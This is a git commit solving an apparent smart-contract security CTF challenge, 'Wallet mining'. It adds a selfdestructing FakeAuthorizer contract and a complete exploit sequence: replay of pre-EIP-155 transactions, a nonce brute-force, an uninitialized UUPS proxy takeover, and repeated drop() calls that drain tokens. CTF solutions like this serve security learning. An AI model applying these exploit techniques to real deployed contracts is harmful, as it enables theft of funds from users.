748169c6bec4c8790b59f143a2f63fbb148ef512
pkqs90 <pkqs90@gmail.com>
2023-12-18 17:25:30 +0800

    13 wallet mining

---
+++ contracts/wallet-mining/FakeAuthorizer.sol
@@ -0,0 +1,13 @@
+//SPDX-License-Identifier:MIT
+
+pragma solidity ^0.8.0;
+import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+
+contract FakeAuthorizer is UUPSUpgradeable {
+
+    function attack() public {
+        selfdestruct(payable(address(0)));
+    }
+
+    function _authorizeUpgrade(address imp) internal override {}
+}
--- test/wallet-mining/wallet-mining.challenge.js
+++ test/wallet-mining/wallet-mining.challenge.js
@@ -1,5 +1,6 @@
 const { ethers, upgrades } = require('hardhat');
 const { expect } = require('chai');
+const { firstTx, secondTx, createFactoryTx } = require("./deployment.json");
 
 describe('[Challenge] Wallet mining', function () {
     let deployer, player;
@@ -22,7 +23,7 @@ describe('[Challenge] Wallet mining', function () {
             [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
             { kind: 'uups', initializer: 'init' }
         );
-        
+
         expect(await authorizer.owner()).to.eq(deployer.address);
         expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
         expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;
@@ -33,7 +34,7 @@ describe('[Challenge] Wallet mining', function () {
         );
         expect(await walletDeployer.chief()).to.eq(deployer.address);
         expect(await walletDeployer.gem()).to.eq(token.address);
-        
+
         // Set Authorizer in Safe Deployer
         await walletDeployer.rule(authorizer.address);
         expect(await walletDeployer.mom()).to.eq(authorizer.address);
@@ -65,7 +66,78 @@ describe('[Challenge] Wallet mining', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // First, find the deployer who deployed the ProxyFactory and MasterCopy (do this on etherscan) - `0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a`.
+        // - https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
+        // - https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
+
+        // Then, we can find the deployment of MasterCopy and ProxyFactory is the 1st and 3rd transaction of the deployer.
+        // - https://etherscan.io/txs?a=0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a
+
+        // Finally, since the transactions are done BEFORE EIP-155, it does not contain chainId information in the transaction data, which means we can perform
+        // a replay attack on our local chain.
+        const deployer = `0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A`;
+        await player.sendTransaction({
+          from: player.address,
+          to: deployer,
+          value: ethers.utils.parseEther("1"),
+        });
+
+        // Mock the first 2 transactions of deployer, and deploy the `GnosisSafeProxyFactory` which should have the address of `0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`.
+        await ethers.provider.sendTransaction(firstTx);
+        await ethers.provider.sendTransaction(secondTx);
+        const txReceipt = await (await ethers.provider.sendTransaction(createFactoryTx)).wait();
+        const proxyFactory = (await ethers.getContractFactory("GnosisSafeProxyFactory")).attach(txReceipt.contractAddress);
+        expect(txReceipt.contractAddress).to.be.equal(`0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B`);
+
+        // Calculate the nonce of the deployment of `GnosisSafeProxyFactory`. Since it uses `create`, we can bruteforce the nonce.
+        // nonce == 43.
+        // for (let i = 1; i < 50; i++) {
+        //   const addr = ethers.utils.getContractAddress({
+        //   from: "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B",
+        //   nonce: i,
+        // });
+        // if (addr == "0x9B6fb606A9f5789444c17768c6dFCF2f83563801") {
+        //   console.log("Deposit deployment nonce", i);
+        // }
+        // }
+
+        // Deploy mockWallet to drain funds from `DEPOSIT_ADDRESS`.
+        const mockWalletFactory = await ethers.getContractFactory("MockWallet");
+        const mockWallet = await mockWalletFactory.deploy();
+        for (let i = 1; i <= 42; i++) {
+            await proxyFactory.createProxy(mockWallet.address, []);
+        }
+        const payload = mockWalletFactory.interface.encodeFunctionData("attack", [
+            token.address,
+            player.address,
+        ]);
+        await proxyFactory.createProxy(mockWallet.address, payload);
+
+        // UUPSUpgradable Implementation Slot: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+        const implementationSlot = await ethers.provider.getStorageAt(authorizer.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
+        const implementationAddr = `0x` + implementationSlot.slice(-40);
+
+        // Connect `AuthorizerUpgradeable` to be its owner.
+        const authorizerUpgradeable = (await ethers.getContractFactory("AuthorizerUpgradeable")).attach(implementationAddr);
+        await authorizerUpgradeable.connect(player).init([], []);
+
+        // Deploy `FakeAuthorizer` for upgrade.
+        const fakeAuthorizerFactory = (await ethers.getContractFactory("FakeAuthorizer"));
+        const fakeAuthorizer = await fakeAuthorizerFactory.deploy();
+
+        // Upgrade the `AuthorizerUpgradeable`'s logic contract to our `FakeAuthorizer`.
+        await authorizerUpgradeable
+          .connect(player)
+          .upgradeToAndCall(fakeAuthorizer.address, fakeAuthorizerFactory.interface.encodeFunctionData("attack", []));
+
+        // The `can()` function on `walletDeployer` should be true by now.
+        expect(await walletDeployer.can(player.address,DEPOSIT_ADDRESS)).to.be.true;
+
+        // Run `drop()` 43 times to drain all of `walletDeployer` tokens.
+        for (let i = 0; i < 43; i++) {
+            await walletDeployer.connect(player).drop([]);
+        }
+
     });
 
     after(async function () {
